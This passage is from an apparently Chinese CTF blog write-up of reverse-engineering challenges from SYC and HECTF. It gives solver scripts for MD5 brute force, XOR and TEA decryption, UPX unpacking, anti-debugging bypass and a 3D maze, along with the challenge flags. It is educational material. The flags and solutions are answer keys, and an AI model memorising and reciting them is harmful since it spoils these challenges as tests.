class="comment">#SYC&#123;Just_a_Eeeeeeasy_Rc4_right?&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute_force"></a>Brute_force</h2><p>go语言逆向，现在ida7.6已经很好的解决了go语言符号表恢复的问题，主要是从main_main开始分析，做这道题主要是考察动调的能力，通过分析可知，使用的命令行传参。</p><p>如何命令行传参呢。<br><img src="https://i.loli.net/2021/11/11/AipBU9ISReMt8fL.png"><br>开始分析。<br><img src="https://i.loli.net/2021/11/11/ofymTRjzHxesJB4.png"><br>接下来分析加密函数。<br><img src="https://i.loli.net/2021/11/11/zuGAfO7xMqpd8vC.png"><br>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">table=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/_&quot;</span></span><br><span class="line">list1=[<span class="string">&#x27;957a3926d4ff16d0d3bac4ed3044537b&#x27;</span>,<span class="string">&#x27;d7bf94ada03842f20934c5605728fbc5&#x27;</span>,<span class="string">&#x27;5781f597ce91fb5f66057f35846bcb78&#x27;</span>,<span class="string">&#x27;ae4b9b5b2468a3d15b6b8690b761e160&#x27;</span>,<span class="string">&#x27;4ad50c4af2c5beda7aca217afbac9bd6&#x27;</span>, <span class="string">&#x27;f40b339be4c5898741b8a0d2a8007bd5&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">128</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">128</span>):</span><br><span class="line">                    <span class="built_in">str</span> = <span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d)</span><br><span class="line">                    flag = hashlib.md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> flag == j.casefold():</span><br><span class="line">                        print(<span class="built_in">str</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#7h3_g0_pr0g@rm_13_slgned</span></span><br></pre></td></tr></table></figure><h2 id="Win32"><a href="#Win32" class="headerlink" title="Win32"></a>Win32</h2><p>upx脱壳，后发现经典的win32窗口，如果了解过一些win32知识，做起肯定是简单的，如果没了解过，也没关系，因为这个题因为出题人的小失误，变成了签到题。</p><p>对于这种题型，首先需要去找到，消息处理函数，其实我们对窗口做一些操作，比如说关闭窗口，点击窗口，输入东西，都会记录在消息列队里面，有些消息是由系统自己处理，有些就是由出题人自己写的处理方法处理，这些方法就在消息处理函数中。</p><p>这个函数就在winmain中的sub_1400011EC，学习下windows窗口的创建就可以知道了。</p><p>先创建了个子窗口<br><img src="https://i.loli.net/2021/11/15/qb19yKOmhncRHPg.png"></p><p>然后是0x111</p><pre><code>WM_COMMAND0x0111选择窗口菜单项或某个控件发送一条消息给它的父窗口或按下一个快捷键时产生此消息</code></pre><p>这意味着我们按下试试呢，就会进入这个case语句。<br><img src="https://i.loli.net/2021/11/15/enO9TEiAXhfrcYV.png"><br>所以这道题解个base64就行。</p><p>flag</p><pre><code>SYC&#123;y0u_g3t_A_f1ag_by_cyberloafing_auth0r&#125;</code></pre><h2 id="wasm"><a href="#wasm" class="headerlink" title="wasm"></a>wasm</h2><p>这个题就是一种题型，可以先看看这两篇文章，介绍了这种题怎么出的，和怎么解。</p><p><a href="https://www.anquanke.com/post/id/179556">https://www.anquanke.com/post/id/179556 </a><br><a href="https://blog.csdn.net/TurkeyCock/article/details/83317935">https://blog.csdn.net/TurkeyCock/article/details/83317935</a></p><p>所以需要安装wabt（<a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a>），linux下安装就行。</p><pre><code>$ mkdir build$ cd build$ cmake .. $ cmake --build .</code></pre><p>根据个人情况，先安装camke，第3条指令会报错，需要加上报错语句里面的最后一句话当参数，off什么来着，方可成功。</p><p>之后就可以跟着文章做，得到o文件。</p><p>分析o文件，发现init_memory导入了很多数据。<br><img src="https://i.loli.net/2021/11/15/VwCXfIqmQ52Fjrz.png"><br>然后看main，发现了下面的语句</p><pre><code>if ( i32_load(&amp;w2c_memory, v5 + 88, ((unsigned __int64)(unsigned int)v5 + 88) &gt;&gt; 32) != 22 )i32_store8(&amp;w2c_memory, v4, 0, v3 ^ 0x66);</code></pre><p>所以推测就是长度为22的数据，然后和0x66异或，实际上爆破都行，题目文件也给了xor。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc=[<span class="number">0x35</span>, <span class="number">0x3F</span>, <span class="number">0x25</span>, <span class="number">0x1D</span>, <span class="number">0x11</span>, <span class="number">0x07</span>, <span class="number">0x15</span>, <span class="number">0x0B</span>, <span class="number">0x39</span>, <span class="number">0x2F</span>,</span><br><span class="line">  <span class="number">0x15</span>, <span class="number">0x39</span>, <span class="number">0x35</span>, <span class="number">0x56</span>, <span class="number">0x39</span>, <span class="number">0x21</span>, <span class="number">0x09</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x47</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0x1B</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    print(<span class="built_in">chr</span>(i^<span class="number">0x66</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#SYC&#123;wasm_Is_S0_Go0d!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="猜拳"><a href="#猜拳" class="headerlink" title="猜拳"></a>猜拳</h2><p>也是一个win32程序，估计加了保护器，所有代码都被加密了。没事，动调就行，在动调的过程中直接f9，还发现了反调试，所以就可以根据反调试来找到main函数了，一种是慢慢调试，找出弹出反调试的messagebox的窗口在哪，第二种就是调试过程中，找到isdebugprevent函数，打个断点，然后断下来。</p><p>winmain<br><img src="https://i.loli.net/2021/11/15/jqlCv3xsLn2EMGp.png"></p><p>仔细分析下，消息处理函数，发现有个函数里面还有switch case，并且有个case在rc4解密，然后调用messagebox，估计就是打印flag了。<br>然后在7FF6E4761567处直接set ip，然后f8调试，就会弹出一个有flag的窗口了。</p><pre><code>SYC&#123;gR3@t1_Y0U_ch3@t_@nd_w!n_gam3&#125;</code></pre><h2 id="have-a-tea"><a href="#have-a-tea" class="headerlink" title="have a tea"></a>have a tea</h2><p>一个elf文件，也是一个类似于加壳的文件，静态看不到代码，动调就行。</p><p>动调执行完最下面的jmp指令，就可以看到和elf文件常见的start函数了，开始分析，发现是利用fork创建了个子进程，然后就不能调试了，一种类似于CreateProcess的反调试方法，只不过可以用set ip来强行调试那个关键函数。</p><p>set ip 调试sub_5576384552BD函数，发现加密方式就是将字符串变为unsigned int类型，然后两个为一组，先异或，然后进行tea加密，异或的值是前一组加密后的值，第一组是和key的1,2个进行异或。</p><p><img src="https://i.loli.net/2021/11/15/jqlCv3xsLn2EMGp.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//try_hardgive_you_cup_tea</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//SYC&#123;abcdefghijklmnopqrstuvwxyz1234567&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0x65766967, 0x756F795F, 0x7075635F, 0x6165745F</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *flag , <span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=<span class="number">0</span>,i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x61C88647</span>;</span><br><span class="line">    v0=flag[<span class="number">0</span>];</span><br><span class="line">    v1=flag[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum-=delta;</span><br><span class="line">        v0+=( (v1&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>] ) ^ ( v1+sum ) ^((v1&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>]);</span><br><span class="line">        v1+=( (v0&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>] ) ^ ( v0+sum ) ^((v0&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">0</span>]=v0;</span><br><span class="line">    flag[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code , <span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=<span class="number">0xC6EF3720</span>,i;<span class="comment">// sum=0xC6EF3720</span></span><br><span class="line"></span><br><span class="line">    v0=code[<span class="number">0</span>];</span><br><span class="line">    v1=code[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1-=( (v0&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>] ) ^ (v0+sum) ^ ( (v0&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>] );</span><br><span class="line">        v0-=( (v1&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>] ) ^ (v1+sum) ^ ( (v1&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>] );</span><br><span class="line">        sum+=delta;</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=v0;</span><br><span class="line">    code[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0x7b435953, 0x79615379 0x446e6153 0x5f6e6169  0x6e30685a 0x5f614c5f 0x5f6e3179 0x5f616843 0x6e614978 0x0202007d</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">6</span>]=&#123;<span class="number">0x5F797274</span>,<span class="number">0x64726168</span>,<span class="number">0x65766967</span>, <span class="number">0x756F795F</span>, <span class="number">0x7075635F</span>, <span class="number">0x6165745F</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">10</span>]=&#123;<span class="number">0xC9FA3B95</span>, <span class="number">0x7CFD0735</span>, <span class="number">0x958C7C9F</span>, <span class="number">0xC143B59E</span>, <span class="number">0x61741E89</span>, <span class="number">0xF47DCDC4</span>, <span class="number">0xD6E2A1F2</span>, <span class="number">0x6A38E9AD</span>, </span><br><span class="line">    <span class="number">0xC2C16FEB</span>, <span class="number">0x8C0EE999</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flag[<span class="number">10</span>]=&#123;<span class="number">0x7b435953</span>, <span class="number">0x79615379</span> ,<span class="number">0x446e6153</span> ,<span class="number">0x5f6e6169</span>  ,<span class="number">0x6e30685a</span> ,<span class="number">0x5f614c5f</span> ,<span class="number">0x5f6e3179</span> ,<span class="number">0x5f616843</span> ,<span class="number">0x6e614978</span> ,<span class="number">0x0202007d</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">    decrypt(&amp;code[<span class="number">0</span>],&amp;key[<span class="number">2</span>]);</span><br><span class="line">    code[<span class="number">0</span>]^=key[<span class="number">0</span>];</span><br><span class="line">    code[<span class="number">1</span>]^=key[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x %08x\n&quot;</span>,code[<span class="number">0</span>],code[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%08x:&quot;,code[i]);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="keyword">char</span>*)&amp;flag[i]+<span class="number">0</span>),*((<span class="keyword">char</span>*)&amp;flag[i]+<span class="number">1</span>),*((<span class="keyword">char</span>*)&amp;flag[i]+<span class="number">2</span>),*((<span class="keyword">char</span>*)&amp;flag[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%08x %08x&quot;,code[0],code[1]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//SYC&#123;ySaySanDian_Zh0n_La_y1n_Cha_xIan&#125;</span></span><br></pre></td></tr></table></figure><h1 id="HECTF"><a href="#HECTF" class="headerlink" title="HECTF"></a>HECTF</h1><p>排名还行，听说还有线下，比赛友好，几乎没有恶臭的py交易，题目质量也不错，有许多坑，需要细心，比赛时在打湖湘杯，所有没时间做完，后面补了几题，只剩道安卓，安卓硬伤呀，然后去看了看<a href="https://blog.csdn.net/whiteman2/article/details/121344451?ops_request_misc=&request_id=&biz_id=&utm_medium=distribute.pc_search_result.none-task-code-2~all~es_rank~default-7-121344451-8.pc_search_all_es&utm_term=HECTF">BinaryNoob</a>师傅的wp，发现思路没问题，可能我自己弄的jpg文件头有问题吧。</p><h2 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h2><p>shift 12看字符串就行。</p><pre><code>HECTF&#123;HElLo_RRRRe&#125;</code></pre><h2 id="Baby-upx"><a href="#Baby-upx" class="headerlink" title="Baby_upx"></a>Baby_upx</h2><p>esp定律手脱壳后，发现就是个异或加密，产生的异或值是确定的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s=[<span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span>, <span class="number">0x1A</span>, <span class="number">0x21</span>, <span class="number">0x2A</span>, <span class="number">0x07</span>, <span class="number">0x7D</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x1E</span>, <span class="number">0x0B</span>, <span class="number">0x04</span>, <span class="number">0x29</span>, <span class="number">0x24</span>, <span class="number">0x04</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;aaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line">x=[ <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x29</span>, <span class="number">0x24</span>, <span class="number">0x29</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x29</span>, <span class="number">0x27</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0x27</span>, <span class="number">0x35</span>, <span class="number">0x29</span>, <span class="number">0x29</span>, <span class="number">0x29</span>, <span class="number">0x24</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    print(<span class="built_in">chr</span>(s[i]^x[i]^<span class="built_in">ord</span>(flag[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#Thi5_iiS5_UUPX_LalA</span></span><br></pre></td></tr></table></figure><h2 id="Baby-maze"><a href="#Baby-maze" class="headerlink" title="Baby_maze"></a>Baby_maze</h2><p>去掉花指令，发现是一个金字塔3维迷宫，随着层数的增加，边界会缩小。</p><p>打印出每层的迷宫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//sddddHssaSasHHsdHdwHdsH</span></span><br><span class="line"><span class="comment">//o....^oo0~0o^^o.^.O^.o^</span></span><br><span class="line"><span class="comment">//HECTF&#123;o....^oo0~0o^^o.^.O^.o^&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> map1[<span class="number">6</span>][<span class="number">6</span>]=&#123;<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> map2[<span class="number">5</span>][<span class="number">5</span>]=&#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> map3[<span class="number">4</span>][<span class="number">4</span>]=&#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> map4[<span class="number">4</span>][<span class="number">3</span>]=&#123;  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> map5[<span class="number">4</span>][<span class="number">2</span>]=&#123; <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> map6[<span class="number">3</span>][<span class="number">1</span>]=&#123;<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">6</span>;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,map1[i][j]);</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,map2[i][j]);</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,map3[i][j]);</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,map4[i][j]);</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,map5[i][j]);</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span 